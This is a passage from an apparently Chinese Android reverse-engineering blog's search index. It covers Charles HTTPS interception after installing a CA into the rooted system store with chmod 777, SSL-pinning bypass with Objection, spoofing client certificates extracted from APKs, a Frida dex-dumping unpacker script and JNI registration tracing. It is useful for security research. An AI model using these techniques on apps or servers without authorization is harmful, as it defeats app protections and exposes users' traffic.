这里要设置下端口,不设置端口,Charles只会做转发,不会解密Https数据. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:3:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"将Charles证书加入到Android系统信任的证书列表中 在开启SSL Proxying模式后,用VPN代理模式使用手机浏览器访问任意HTTPS站点时,浏览器会显示提示信息\"您的连接不是私密连接”,为了解决这个问题,我们需要将Charles证书加入到Android系统信任的证书列表中,具体步骤如下: Charles导出cer证书,保存在PC上. 修改证书名称. //Android系统证书目录 /system/etc/security/cacerts/ //每个证书的命名规则,文件名是一个Hash值，而后缀是一个数字 //后缀名的数字是为了防止文件名冲突的,比如如果两个证书算出的Hash值是一样的话,那么一个证书的后缀名数字可以设置成0,而另一个证书的后缀名数字可以设置成1 \u003cCertificate_Hash\u003e.\u003cNumber\u003e //文件名可以用下面的命令计算出来 openssl x509 -inform DER -subject_hash_old -in \u003cCertificate_File.cer\u003e openssl x509 -inform PEM -subject_hash_old -in \u003cCertificate_File.pem\u003e 复制证书到Android设备上. adb push xxxxxxx.0 /sdcard/ 复制到Android系统目录,并修改权限. adb shell su mount -o remount,rw / cp /sdcard/1146ce35.0 /system/etc/security/cacerts/ chmod 777 /system/etc/security/cacerts/* mount -o remount,ro / adb reboot 执行完上述命令,手机重启之后,Charles的证书就会放在系统证书中被系统信任. 如果运气不好,可能会出现下面的错误,原因是root的不彻底,权限不够,换一种方式root即可. 此时切换为VPN代理模式,用手机浏览器访问任意HTTPS站点,Charles就能够正常抓到数据了. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:3:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Socks5抓包配置 如果App不使用HTTP/HTTPS连接方式,那么主机的抓包软件就无法正常抓到数据包,为了绕过对协议的限制,我们选择将VPN代理中的\"代理类型\"设置为SOCKS5模式,为了区分于HTTPS/HTTP CONNECT代理类型要将服务器端口修改为8888,从而从应用层的下层对所有网络连接进行抓取. 与此同时要在Charles上进行配置. 由于使用的是SOCKS代理模式,因此哪怕App使用Socket进行网络连接,Charles也可以正常抓取. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:4:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"OSI七层模型 OSI七层网络模型 TCP/IP五层概念模型 对应网络协议 应用层(Application) HTTP、HTTPS、WS、FTP、DNS、SMTP、TFTP、SNMP、POP3、DHCP 表示层(Presentation) 应用层 TELNET、RLOGIN、SNMP、GOPHER 会话层(Session) SMTP、DNS 传输层(Transport) 传输层 TCP、UDP 网络层(Network) 网络层 IP(TPV4、IPV6)、ICMP、IGMP、ARP 数据链路层(Data Link) 数据链路层 FDDI、ETHERNET、APPANET、PDN、SLIP、PPP 物理层(Physical) 物理层 IEEE 802.1A、IEEE 802.2到IEEE 802.11 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:5:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Http协议 HTTP(超文本传输协议)是一个基于请求与响应模式的、无状态的、应用层的协议，基于TCP的连接方式. URL: URL是一种特殊类型的URI,包含了用于查找某个资源的足够的信息.格式如下: http://host[\":\"port][abs_path] http: 表示要通过HTTP协议来定位网络资源. host: 表示合法的Internet主机域名或者IP地址. port: 指定一个端口号,为空则使用缺省端口80. abs_path: 指定请求资源的URI,如果URL中没有给出abs_path,那么当它作为请求URI时,必须以“/”的形式给出. Http请求: 由以下四部分组成:请求行、请求头部、请求空行、请求数据. 下方的URL其实是abs_path. 请求方法: 方法 描述 GET 请求获取Request-URI所标识的资源 POST 在Request-URI所标识的资源后附加新的数据 HEAD 请求获取由Request-URI所标识的资源的响应消息报头 PUT 请求服务器存储一个资源,并用Request-URI作为其标识 DELETE 请求服务器删除Request-URI所标识的资源 TRACE 请求服务器回送收到的请求信息,主要用于测试或诊断 CONNECT 用于某些代理服务器,请求的连接转化为一个安全隧道 OPYIONS 请求查询服务器的性能,或者查询与资源相关的选项和需求 PATCH 是对PUT方法的补充,用来对已知资源进行局部更新 请求头: 请求头 描述 Host 接受请求的服务器地址,可以是IP:端口号,也可以是域名 User-Agent 发送请求的应用程序名称 Connection 指定与连接相关的属性,如Connection:Keep-Alive Accept-Charset 通知服务端可以发送的编码格式 Accept-Encoding 通知服务端可以发送的数据压缩格式 Accept-Language 通知服务端可以发送的语言 Http响应: 由以下四部分组成:状态行、响应头部、响应空行、响应正文. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:6:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Https实现原理 Https的整体过程分为证书验证和数据传输阶段. 证书验证阶段: 浏览器发起Https请求. 服务端返回Https证书. 客户端验证证书是否合法,如果不合法则提示警告. 数据传输阶段: 当证书验证合法后,在本地生成随机数. 通过公钥加密随机数,并把加密后的随机数传输到服务端. 服务端通过私钥对随机数进行解密. 服务端通过客户端传输的随机数构造对称加密算法,对返回结果内容进行加密后传输. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:7:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"中间人抓包 中间人攻击,实际上是指客户端在传输数据到服务端的中间过程中,被在链路上的一个设备进行抓取过滤甚至篡改,将完整的客户端-服务端通信在客户端和服务器无感的状态下分割成客户端-攻击者和攻击者-服务端两个通信阶段. 我们在Https上的应用层抓包原理也是基于中间人攻击的方式.Https上的应用层抓包原理主要\"攻破\"的是Https传输过程中验证身份的步骤,我们在配置抓包环境时是将Charles证书加入到系统本身信任的证书中,当应用进行通信时,如果没有进一步的安全保护措施,那么客户端接收到的服务器证书即使是Charles证书也会继续通信,整个过程如下: ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:8:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"对抗手段 为了应对这一通过手动给系统安装证书从而导致中间人攻击继续生效的风险,App也对该类攻击推出了对抗手段,主要有以下两种方式: SSL Pinning 原理 也称为证书绑定,该种方式不仅校验服务器证书是否是系统中的可信凭证,在通信过程中甚至连系统内置的证书都不信任而只信任App指定的证书.一旦发现服务器证书为非指定证书即停止通信,最终导致即使将Charles证书安装到系统信任凭据中也无法生效. 绕过方式 客户端在校验服务器的情况时,考虑到对证书验证的代码是写在App内部,自然而然就可以通过Hook修改校验服务器的代码,从而使得判断的机制失效. 前人的研究工作如下: 可以利用Objection命令完成Bypass. android sslpinning disable Github开源项目-DroidSSLUnpinning. https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js DroidSSLUnpinning.7z 由于SSL Pinning的功能是开发者自定义的,因此并不存在一个通用的解决方案,Objection和DroidSSLUnpinning也只是对常见的App所使用的网络框架中对证书进行校验的代码逻辑进行了Hook修改,一旦App中的代码被混淆或使用了未知的框架,这些App的客户端校验服务器的逻辑就需要安全人员自行分析. 服务器校验客户端 原理 这种方式发生在Https验证身份阶段,服务器在接受到客户端的公钥后,在发送session key之前先对客户端的公钥进行验证,如果不是信任的证书公钥,服务器就中止和客户端的通信. 绕过方式 服务器并不掌握在分析人员手中,因此在中间人的状态下与服务器进行通信的实际上已经变成抓包软件,比如Charles.通常来说,我们所能做的对抗手段就是将App中内置的证书导入Charles中,使得服务端认为自己仍旧是在与其信任的客户端进行通信,最终达到欺骗服务器的目的. 具体的操作需要完成两项工作: 分析Apk,找到证书文件和相应的证书密码. 在找到证书和密码后将其导入到抓包软件中,比如导入Charles.打开Charles,依次单击Proxy-\u003eSSL Proxy Settings-\u003eClient Certificates-\u003eAdd 添加新证书,然后输入指定的域名IP以及端口并导入p12或者pem格式的证书,之后即可将Charles伪装成使用特定证书的客户端,最终达到正常抓包的目的. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:8:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Hook模拟抓包 这种方式的抓包虽然不如抓包软件抓到的数据包全面,但是如果能够顺利Hook到发包函数,就可以直接无视证书,甚至通过Hook直接得到参数并在Hook的函数中通过打印函数调用栈得到函数的调用链,为后续分析带来便利. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:9:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Objection 这里来展示下如何利用Objection快速定位App中的收发包函数. 示例Apk moveTV.apk 步骤展示 切换到Objection的目录,删除旧的日志. cd ~/.objection rm * 启动App,使用Objection附加到App进程. objection.exe -g com.cz.babySister explore 运行下述命令,获取App已经加载的所有类. android hooking list classes 输入exit命令,退出Objection,到Objection目录重命名日志文件(objection.log),防止后续操作影响本次生成的日志文件,这里重命名为objection1.log 使用网络框架相关的关键词来过滤相关类. cat .\\objection1.log |grep -i HttpURLConnection cat .\\objection1.log |grep -i okhttp3 cat .\\objection1.log |grep -i okhttp ... //看上述哪个过滤的数量比较多,就重定向到文件中,如: cat .\\objection1.log |grep -i okhttp \u003e1.txt 通过一些文件编辑器快速输入多行相同的数据来补全每一行中类的Objection命令.这里使用notepad++通过Shift+Alt对每一行首进行全选,并输入以下命令. android hooking watch class 切割上述文件中的命令为多个文件,防止Objection一次性Hook太多类崩溃. 重新使用Objection附加到App上,并使用-c执行文件中的命令. objection.exe -g com.cz.babySister explore -c \".\\1.txt\" 在手机上对App进行操作(这里主要是点击App中的登录按钮,抓通信数据.),如果Objection界面中没有任何函数被调到,就应该回到第8步,更换包含Hook命令的文本文件.如果在Objection界面看到一堆函数被调用,说明框架类型确认成功. 任意选择上图中被调用的函数,比如说选择com.android.okhttp.internal.http.RealResponseBody.source()这个函数.此时退出Objection,重新附加上App,使用下述命令进行单一Hook. android hooking watch class_method com.android.okhttp.internal.http.RealResponseBo dy.source --dump-args --dump-backtrace --dump-return 此时去点击App中的登录按钮,查看Objection界面. 这样就找到了发包函数com.cz.babySister.c.a.a Hook上述函数进行验证. android hooking watch class_method com.cz.babySister.c.a.a --dump-args --dump-back trace --dump-return 这里我们输入的账号和密码分别是123和qwertyuiop 缺点 上述过程过于依赖利用网络通信框架的关键词进行过滤,假如要分析的App本身存在强度非常大的混淆,将App中一些用来快速定位网络框架的关键字混淆成了无意义的字符,那么Hook抓包定位的方式就失效了. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:9:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"OkHttpLogger 介绍 Github链接: https://github.com/siyujie/OkHttpLogger-Frida OkHttpLogger-Frida.7z 这是一个能够完成混淆后的okhttp Hook的项目,在该项目中,Hook的方法脱离了直接经过字符串匹配的方式,反而通过反射去获取所有类并利用okhttp3框架的一些特征去验证App中是否使用了okhttp3这个网络通信框架. 示例Apk 春水堂.apk 步骤展示 将项目中的okhttpfind.dex放到手机的/data/local/tmp目录下,并为之提升权限. adb push .\\okhttpfind.dex /data/lcoal/tmp adb shell su chmod 777 /data/lcoal/tmp/okhttpfind.dex 启动App,使用下述命令将okhttp_poker.js注进去. //加入-o LuoHun.txt 可以将Frida一次注入后的所有输出保存到文件中,可供后续 frida -U org.sfjboldyvukzzlpp -l .\\okhttp_poker.js -o LuoHun.txt 按照提示输入find()命令,执行寻找okhttp框架的功能. 将找到的结果全部复制并覆盖原okhttp_poker.js脚本中关于okhttp类的一些定义. 执行hold()命令,开启Hook,然后开始操作App,就会发现一堆网络连接的内容. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:9:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e HTTP 消息结构 HTTPS 详解一：附带最精美详尽的 HTTPS 原理图 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:10:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android Frida"],"content":"官方教程 https://frida.re/docs/building/#gnulinux 这里我们也使用Ubuntu20.04进行编译. ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:1:0","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"开始编译 ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:0","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"安装一些辅助工具 //设置root密码 sudo passwd root //更新 apt update //安装net工具,可以使用ifconfig apt install net-tools //文本编辑工具 apt install gedit //代理工具,科学上网 apt install proxychains //设置socks5代理 gedit /etc/proxychains.conf ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:1","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"安装官方推荐环境 proxychains apt-get install build-essential curl git lib32stdc++-9-dev \\ libc6-dev-i386 nodejs npm python3-dev python3-pip //编译check-core-linux-x86_64的时候需要 proxychains apt-get install gcc-multilib g++-multilib ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:2","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"拉Frida源码 proxychains git clone --recurse-submodules https://github.com/frida/frida cd frida ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:3","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"配置toolchain和sdk 官方toolchain和sdk下载链接如下: 其中20220318是frida中releng/deps.mk中的frida_deps_version,后面部分则是toolchain-{平台+架构}.tar.bz2 https://build.frida.re/deps/20220318/toolchain-linux-x86_64.tar.bz2 https://build.frida.re/deps/20220318/sdk-linux-x86_64.tar.bz2 https://build.frida.re/deps/20220318/sdk-android-arm.tar.bz2 https://build.frida.re/deps/20220318/sdk-android-arm64.tar.bz2 在frida文件夹下面新建build文件夹,使用wget将上述链接文件放进去. 接下来在frida文件夹下,执行下述命令. releng/setup-env.sh ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:4","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"配置NDK 在frida文件夹下,执行下述命令,就会报需要的NDK版本. make core-android-arm64 去官网下载NDK. https://developer.android.google.cn/ndk/downloads/ //这里我们下载r24的Linux NDK https://dl.google.com/android/repository/android-ndk-r24-linux.zip 解压上述下载的文件. unzip android-ndk-r24-linux.zip 配置环境变量. gedit ~/.bashrc //将下述内容添加到上述文件的末尾 export ANDROID_NDK_ROOT=/home/luohun/Desktop/android-ndk-r24 export PATH=$ANDROID_NDK_ROOT:$PATH //检查是否配置成功 source ~/.bashrc ndk-build --v ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:5","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"编译 在frida目录下执行make,会让你选择编译的平台,这里我们编译arm64平台的. make core-android-arm64 最终产物在 frida/build/frida-android-arm64/bin目录下. ","date":"2022-04-23","objectID":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/:2:6","tags":["Frida"],"title":"Frida源码编译","uri":"/posts/android/android-hook/frida/frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"},{"categories":["Android Frida"],"content":"Frida脱壳 这里以脱一代整体壳为例. 优点:调试简单,java层的所有功能都能轻易实现. 缺点:native层的部分系统函数是inline函数,没办法hook,也没办法主动调用. ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:1:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"定位脱壳点 我们在Java层主动加载一个类是调用dexClassLoader.loadClass来加载类的.因此可以阅读DexClassLoader类的loadClass源码来寻求答案. //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java DexClassLoader -\u003eBaseDexClassLoader -\u003eClassLoader -\u003eloadClass protected Class\u003c?\u003e loadClass(String name, boolean resolve) throws ClassNotFoundException { // First, check if the class has already been loaded Class\u003c?\u003e c = findLoadedClass(name); if (c == null) { try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. c = findClass(name); } } return c; } //如果没找到的话,就调用子类的findClass //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java BaseDexClassLoader.findClass -\u003epathList.findClass(name, suppressedExceptions) //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java DexPathList.findClass -\u003eelement.findClass -\u003edexFile.loadClassBinaryName //http://androidxref.com/8.1.0_r33/xref/libcore/dalvik/src/main/java/dalvik/system/DexFile.java DexFile.loadClassBinaryName -\u003edefineClass -\u003edefineClassNative //进入Native层 //http://androidxref.com/8.1.0_r33/xref/art/runtime/native/dalvik_system_DexFile.cc defineClassNative -\u003eclass_linker-\u003eDefineClass -\u003eLoadClass -\u003eLoadClassMembers -\u003eLoadMethod(const DexFile\u0026 dex_file,const ClassDataItemIterator\u0026 it,Handle\u003cmirror::Class\u003e klass,ArtMethod* dst) //Native层凡出现DexFile的地方均可作为脱壳点 ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:1:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Apk FridaShell.apk ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:1:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook代码 这里通过Hook libart.so中的LoadMethod函数来实现脱壳. var map = {}; function main() { var libart = Module.enumerateSymbols(\"libart.so\"); var addr = NULL; for (var n in libart) { if (libart[n].name.indexOf(\"lassLinker10LoadMethodERKNS\") \u003e= 0) { addr = libart[n].address; break; } } Interceptor.attach(addr, { onEnter: function (arg) { var begin = ptr(arg[1]).add(Process.pointerSize).readPointer(); var size = ptr(arg[1]).add(Process.pointerSize * 2).readU32(); if (map[size] == undefined) { map[size] = begin; dump(begin, size) } } }) } function dump(begin, size) { var path = \"/sdcard/\" + size + \".dex\"; var file = new File(path, \"w\"); file.write(ptr(begin).readByteArray(size)); file.flush(); file.close(); console.log(\"dump success \" + size + \".dex\") } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:1:3","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"追踪静态注册函数地址 ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:2:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试APK //Java层 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); //方便IDA附加 try { Thread.sleep(10 * 1000); } catch (InterruptedException e) { e.printStackTrace(); } LuoTst(); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); public native void LuoTst(); } //Native层 #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003candroid/log.h\u003e #include \u003cdlfcn.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"Luo\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"Luo\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"Luo\", __VA_ARGS__); extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv *env, jobject thiz) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } extern \"C\" JNIEXPORT void JNICALL Java_com_example_luonative_MainActivity_LuoTst(JNIEnv *env, jobject thiz) { void *handle = dlopen(\"libc.so\", 0); void *addr = dlsym(handle, \"strstr\"); LOGD(\"strstr addr:%p\", addr); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:2:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"定位调试点 假设Native层没有实现Java_com_example_luonative_MainActivity_stringFromJNI这个函数,AS会报以下错误. 说明在遍历so中的导出函数时没有找到上述函数,我们通常找导出函数地址是调用dlsym这个函数.接下来我们在Android源码中跟踪下dlsym这个函数. //http://androidxref.com/8.1.0_r33/xref/bionic/libdl/libdl.c dlsym -\u003e__loader_dlsym -\u003estatic const char ANDROID_LIBDL_STRTAB[] = // 0000000000111111 11112222222222333 333333344444444 44555555555566666 6666677777777778 8888888889999999999 // 0123456789012345 67890123456789012 345678901234567 89012345678901234 5678901234567890 1234567890123456789 \"__loader_dlopen\\0__loader_dlclose\\0__loader_dlsym\\0__loader_dlerror\\0__loader_dladdr\\0__loader_android_up\" -\u003e__dlsym //http://androidxref.com/8.1.0_r33/xref/bionic/linker/dlfcn.cpp#__dlsym __dlsym -\u003edlsym_impl -\u003edo_dlsym(void* handle, const char* sym_name, const char* sym_ver, const void* caller_addr, void** symbol) //http://androidxref.com/8.1.0_r33/xref/bionic/linker/linker.cpp //最终我们发现是调用了linker.so中的do_dlsym函数 ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:2:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"确定Hook点 用IDA附加调试上述apk,在linker64.so中的do_dlsym函数下断,一路单步走,看调用栈. //调用栈 do_dlsym dlsym_impl //http://androidxref.com/8.1.0_r33/xref/art/runtime/java_vm_ext.cc FindSymbol //以下函数返回值均为静态注册的函数地址 FindNativeMethod FindCodeForNativeMethod artFindNativeMethod //http://androidxref.com/8.1.0_r33/xref/art/runtime/entrypoints/jni/jni_entrypoints.cc extern \"C\" const void* artFindNativeMethod() { Thread* self = Thread::Current(); #else extern \"C\" const void* artFindNativeMethod(Thread* self) { DCHECK_EQ(self, Thread::Current()); #endif Locks::mutator_lock_-\u003eAssertNotHeld(self); // We come here as Native. ScopedObjectAccess soa(self); ArtMethod* method = self-\u003eGetCurrentMethod(nullptr); DCHECK(method != nullptr); // Lookup symbol address for method, on failure we'll return null with an exception set, // otherwise we return the address of the method we found. void* native_code = soa.Vm()-\u003eFindCodeForNativeMethod(method); if (native_code == nullptr) { self-\u003eAssertPendingException(); return nullptr; } // Register so that future calls don't come here return method-\u003eRegisterNative(native_code, false); } //从这里可以看到静态注册的函数也是调用了RegisterNative这个函数 ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:2:3","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"打印静态注册函数地址 这里以Hook FindCodeForNativeMethod这个函数为例,通过参数ArtMethod*可以拿到注册的函数名,通过返回值可以拿到注册的地址. const STD_STRING_SIZE = 3 * Process.pointerSize; class StdString { constructor() { this.handle = Memory.alloc(STD_STRING_SIZE); } dispose() { const [data, isTiny] = this._getData(); if (!isTiny) { Java.api.$delete(data); } } disposeToString() { const result = this.toString(); this.dispose(); return result; } toString() { const [data] = this._getData(); return data.readUtf8String(); } _getData() { const str = this.handle; const isTiny = (str.readU8() \u0026 1) === 0; const data = isTiny ? str.add(1) : str.add(2 * Process.pointerSize).readPointer(); return [data, isTiny]; } } function prettyMethod(method_id, withSignature) { const result = new StdString(); Java.api['art::ArtMethod::PrettyMethod'](result, method_id, withSignature ? 1 : 0); return result.disposeToString(); } function main() { var addr = Module.findExportByName(\"libart.so\", \"_ZN3art9JavaVMExt23FindCodeForNativeMethodEPNS_9ArtMethodE\"); Interceptor.attach(addr, { onEnter: function (arg) { var methodname = prettyMethod(arg[1], 0); this.name = methodname; }, onLeave: function (res) { console.log(this.name + \":\" + res); } }) } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:2:4","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"追踪动态注册函数地址 动态注册主要使用RegisterNatives这个函数,查看该部分的Android源码即可. http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc 相关的Frida Hook代码已有大牛写好. https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_RegisterNatives.js function find_RegisterNatives(params) { var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addrRegisterNatives = null; for (var i = 0; i \u003c symbols.length; i++) { var symbol = symbols[i]; //_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi if (symbol.name.indexOf(\"art\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"JNI\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"RegisterNatives\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"CheckJNI\") \u003c 0) { addrRegisterNatives = symbol.address; console.log(\"RegisterNatives is at 